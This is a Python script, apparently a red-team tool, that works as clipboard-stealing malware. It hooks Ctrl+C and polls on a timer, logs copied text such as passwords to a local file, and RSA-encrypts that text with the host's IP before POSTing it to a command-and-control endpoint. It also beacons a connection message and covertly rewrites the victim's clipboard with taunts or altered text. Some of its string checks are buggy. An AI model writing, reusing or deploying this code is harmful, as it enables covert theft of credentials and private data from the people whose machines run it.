import os.path
import pyperclip
import requests
import schedule
import time
import random
from pynput import keyboard
import keyboard
import rsa
import socket

#public key for encryption
public = rsa.PublicKey(
        22801902741575260508046760451684121524343309971392815027806038442328813626689876929878295531764425101721113803279088975380306285103839798562486473563504890609732689910231035352994358600476885112341914819232866689789408515621209722745373194438974054762656866686749518758325281935986106093899741071523184790288397250570095386108667233843051192504696785064008214814463197996158290147894449246014411585018720395948432620796871823751561082698116083062968467223326531809351871820333024478963454054743945987929181103396110463090638025544498539475681820761973201801628104421055632663943101423395201694333712187265928179307257,
        65537)

first_connection = True

def main():
    global first_connection
    #gets the clipboard information and puts it in a file every 90 seconds.
    schedule.every(90).seconds.do(get_clipboard_info)

    #Adds a hotkey, can't have parenthesis because it returns as a none type instead of a boolean
    #explore the timeout feature to add some more functionality
    keyboard.add_hotkey('ctrl+c', get_clipboard_info)
    print('ctrlc added')

    #ctrl V ensures that the clipboard data is changed to password
    #TODO PROBLEM HERE IS GOING to be that it will modify the clipboard twice
    #keyboard.add_hotkey('ctrl+v', change_clipboard)
    #print('ctrlv added')
    if first_connection:
        first_connection = False
        local_hostname = socket.gethostname()
        ip_addresses = socket.gethostbyname_ex(local_hostname)[2]
        filtered = list()
        i = 0

        for ip in ip_addresses:
            if not ip[0:4] == '127.':
                # appends to python list
                filtered.append(ip)
                i += 1

        if len(filtered) != 0:
            ip_connected_message = rsa.encrypt((filtered[0] + ' connected').encode('utf-8'), public)
            requests.post("http://127.0.0.1:80/connect", ip_connected_message)
        else:
            localhost_message = rsa.encrypt(('localhost connected'.encode('utf-8')), public)
            requests.post("http://127.0.0.1:80/connect", localhost_message)

    #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
    #code handles the scheduled task
    while True:
        schedule.run_pending()
        time.sleep(1)

#global value that stores the last clipboardValue copied, starts as empty
last_clip_board_value = ''


def get_clipboard_info():
    #have to define as a global because of how python scope works
    global last_clip_board_value
    global public


    #need a delay here so that the ctrl+c copy updates the clipboard before the information is grabbed
    #if we do not have this delay: at the end of this method the clipboard info is changed to password
    #so if there is no delay then the password sometimes remains as the clipboard info
    #it would then be saved as the clipboard info before copy updates. this delay makes sure that
    #the clipboard is updated with the copied info before it is assigned to any variables
    #short delay so that when ctrl+v is used it still copies password over and then pastes it
    time.sleep(0.25)

    print('get clip started')

    try:
        # paste, pastes text from clipboard
        clipboard_info = pyperclip.paste()

        print('ctrlc added')

        # a appends data to file so the passwords can be stored over time password
        filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')
        if not os.path.exists('C:/Tools/Sysint/MalTest/'):

            #makes the directory if the path doesn't exist
            os.makedirs('C:/Tools/Sysint/MalTest/')
            filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')

        clipboard_data_file = open(filepath, "a")

        #checks if the last clipboard value is equal to the current one
        if not last_clip_board_value == clipboard_info:

            print('copied')

            #writes the clipboard value to the file along with a timestamp
            clipboard_data_file.write(clipboard_info + ' (' + time.asctime(time.localtime()) + ')')
            clipboard_data_file.write("\n")

            #https: // www.w3resource.com / python - exercises / python - basic - exercise - 55.php
            #gets the list of hostnames
            local_hostname = socket.gethostname()

            #gets list of ip addresses associated with hostname
            ip_addresses = socket.gethostbyname_ex(local_hostname)[2]

            #make a list same size as the IP's
            filtered = list()
            i = 0

            for ip in ip_addresses:
                if not ip[0:4] == '127.':
                    #appends to python list
                    filtered.append(ip)
                    i += 1

            # https: // www.w3resource.com / python - exercises / python - basic - exercise - 55.php
            #loops through ip addresses and removes local host callbacks

            #varibale used to store the clipboard info being transmitted in a post request
            #encoded using utf8 so it can be encrypted using rsa
            if len(filtered) != 0:
                formatted_clipboard_info = (clipboard_info + ' - ' + filtered[0] + ' - (' + time.asctime(time.localtime()) + ')').encode('utf8')
            else:
                formatted_clipboard_info = (clipboard_info + ' - localhost - (' + time.asctime(time.localtime()) + ')').encode('utf8')


            encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)

            #closes the file since it is done being used
            clipboard_data_file.close()

            #posts the request back to the c2 server, passing along the encoded clipboard information
            requests.post("http://127.0.0.1:80/output", encoded_clipboard_info)

        #if the last and current clipboard value match then close the file
        else:
            clipboard_data_file.close()

        #Updates the last clipboard value
        last_clip_board_value = clipboard_info

        #changes the clipboard data to the same word but with an invisible character at the end
        change_clipboard()
        #add_invisible_character_to_clipboard()
    except:
        print('NOOOO')
        change_clipboard()
        pass

"""
add_invisible_character_to_clipboard takes the current clipboard_value and adds an invisible character takes takes
to the end of it
"""
def add_invisible_character_to_clipboard() -> None:
    # https://unicode-explorer.com/c/115F
    invisible_character = 'ᅟ'

    # paste, pastes text from clipboard
    clipboard_info = pyperclip.paste()
    print('PasteWorks')

    # copy - copies whatever text to the clipboard
    #in this case copies the current clipboard info plus an invisible character
    #could use endswith or in(java contains)
    #if there is already an invisible character then we don't need another
    if invisible_character in clipboard_info:
        pyperclip.copy(clipboard_info)
    else:
        pyperclip.copy(clipboard_info + invisible_character)

"""
change_password changes the clipboard data to password
"""
def change_password() -> None:
    # copy - copies whatever test to the clipboard
    #in this case copies the current clipboard info plus an invisible character
    pyperclip.copy('password')

def change_clipboard() -> None:
    clipboard_info = pyperclip.paste()
    invisible_character = 'ᅟ'
    print(clipboard_info)

    if 'whoami' in clipboard_info:
        pyperclip.copy('Red Team')
    elif ('who' or 'what' or 'when' or 'where' or 'why') in clipboard_info:
        pyperclip.copy('Question!')
    elif ('blue' or 'Blue') in clipboard_info:
        pyperclip.copy('Red is better than Blue')
    else:
        first_rand_int = random.randint(1,2)

        #look at string modifying
        if first_rand_int == 1:
            counter = 0
            new_clip = clipboard_info.replace('e','3')
            new_clip = new_clip.replace('i', '1')
            new_clip = new_clip.replace(' ', '_')
            pyperclip.copy(new_clip)
        elif first_rand_int == 2:
            second_rand_int = random.randint(1, 6)
            if second_rand_int == 1:
                pyperclip.copy(clipboard_info + invisible_character)
            if second_rand_int == 2:
                pyperclip.copy('Red Team owns your clipboard')
            if second_rand_int == 3:
                pyperclip.copy('Red Red Red Red')
            if second_rand_int == 4:
                pyperclip.copy('No blue')
            if second_rand_int == 5:
                pyperclip.copy('Never gonna give you up, never gonna let you down')
            if second_rand_int == 6:
                pyperclip.copy('It\'s so Shrimple')

    print(pyperclip.paste())
main()